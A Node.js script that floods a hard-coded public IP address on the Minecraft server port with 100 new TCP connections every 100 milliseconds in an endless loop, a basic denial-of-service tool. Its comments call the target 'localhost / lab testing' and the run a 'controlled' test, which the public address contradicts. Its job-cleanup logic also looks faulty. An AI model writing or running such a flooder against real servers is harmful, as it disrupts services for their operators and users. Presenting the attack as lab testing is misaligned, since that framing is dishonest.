const net = require('net');

// ================== CONFIG ==================
const IP = "104.234.6.0";   // localhost / lab testing
const Port = 25565;
const MaxThreads = 100;
const TimeoutMs = 100;
const LoopDelay = 100;
// ============================================

console.log(`Starting controlled Node.js test on ${IP}:${Port}`);

const jobs = [];

function connectWithTimeout(ip, port, timeout) {
    return new Promise((resolve) => {
        const client = new net.Socket();
        let isDone = false;

        client.setTimeout(timeout);

        client.once('connect', () => {
            isDone = true;
            client.destroy();
            resolve();
        });

        client.once('timeout', () => {
            if (!isDone) {
                isDone = true;
                client.destroy();
                resolve();
            }
        });

        client.once('error', () => {
            if (!isDone) {
                isDone = true;
                client.destroy();
                resolve();
            }
        });

        client.connect(port, ip);
    });
}

async function mainLoop() {
    while (true) {
        for (let i = 0; i < MaxThreads; i++) {
            const job = connectWithTimeout(IP, Port, TimeoutMs);
            jobs.push(job);
        }

        // Cleanup completed jobs
        for (let i = jobs.length - 1; i >= 0; i--) {
            if (jobs[i].then) {
                // Check if promise is settled by racing with a resolved promise
                const isSettled = await Promise.race([jobs[i].then(() => true, () => true), Promise.resolve(false)]);
                if (isSettled) {
                    jobs.splice(i, 1);
                }
            }
        }

        await new Promise(resolve => setTimeout(resolve, LoopDelay));
    }
}

mainLoop();
